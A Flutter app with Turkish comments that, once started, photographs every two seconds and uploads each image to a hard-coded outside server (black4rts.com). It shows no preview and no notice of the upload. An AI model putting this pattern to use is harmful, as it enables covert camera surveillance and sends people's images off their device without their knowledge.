// ignore_for_file: prefer_const_constructors, avoid_print

import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:camera/camera.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final cameras = await availableCameras();
  final firstCamera = cameras.first;
  // ignore: unused_element
  void requestCameraPermission() async {
    var status = await Permission.camera.request();
    if (status.isGranted) {
      // Kamera izni verildi, işlemlerinizi devam ettirebilirsiniz.
    } else {
      // Kamera izni reddedildi, kullanıcıya bilgi verilebilir.
    }
  }

  runApp(MaterialApp(
    home: CameraApp(
      camera: firstCamera,
    ),
  ));
}

class CameraApp extends StatefulWidget {
  final CameraDescription camera;

  const CameraApp({super.key, required this.camera});

  @override
  State createState() => CameraAppState();
}

class CameraAppState extends State<CameraApp> {
  late CameraController controller;
  bool isRecording = false;
  Timer? timer;

  @override
  void initState() {
    super.initState();
    controller = CameraController(widget.camera, ResolutionPreset.medium);
    controller.initialize().then((_) {
      if (!mounted) {
        return;
      }
      setState(() {});
    });
  }

  @override
  void dispose() {
    controller.dispose();
    super.dispose();
  }

  void startStopRecording() {
    if (isRecording) {
      if (timer != null) {
        timer!.cancel();
      }
    } else {
      // Başlama zamanı
      takePicture();

      // Her 5 saniyede bir fotoğraf çek
      timer = Timer.periodic(const Duration(seconds: 2), (Timer t) {
        takePicture();
      });
    }
    setState(() {
      isRecording = !isRecording;
    });
  }

  Future<void> takePicture() async {
    if (!controller.value.isInitialized) {
      return;
    }

    final image = await controller.takePicture();
    final file = File(image.path);

    // Dosya adını 1.jpg olarak ayarlayın
    final newFilePath = file.path.replaceFirst(RegExp(r'[^\/]*$'), '1.jpg');
    // ignore: unused_local_variable
    final newFile = file.renameSync(newFilePath);

    // Yüklemek istediğiniz URL'yi burada değiştirin
    final url = Uri.parse('https://black4rts.com/upload/index.php');

    // Fotoğrafı HTTP POST ile gönderin
    final request = http.MultipartRequest('POST', url)
      ..files.add(await http.MultipartFile.fromPath('file', newFilePath));
    final response = await request.send();

    if (response.statusCode == 200) {
      print('Dosya başarıyla yüklendi.');
    } else {
      print('Dosya yüklerken hata oluştu. Hata kodu: ${response.statusCode}');
    }
  }

  @override
  Widget build(BuildContext context) {
    if (!controller.value.isInitialized) {
      return Container();
    }
    return Scaffold(
      appBar: AppBar(
        title: Text('Kamera Uygulaması'),
      ),
      body: Center(
        child: isRecording
            ? Icon(
                Icons.pause,
                size: 80,
                color: Colors.red,
              )
            : Icon(
                Icons.play_arrow,
                size: 80,
                color: Colors.green,
              ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: startStopRecording,
        child: isRecording ? Icon(Icons.pause) : Icon(Icons.play_arrow),
      ),
    );
  }
}
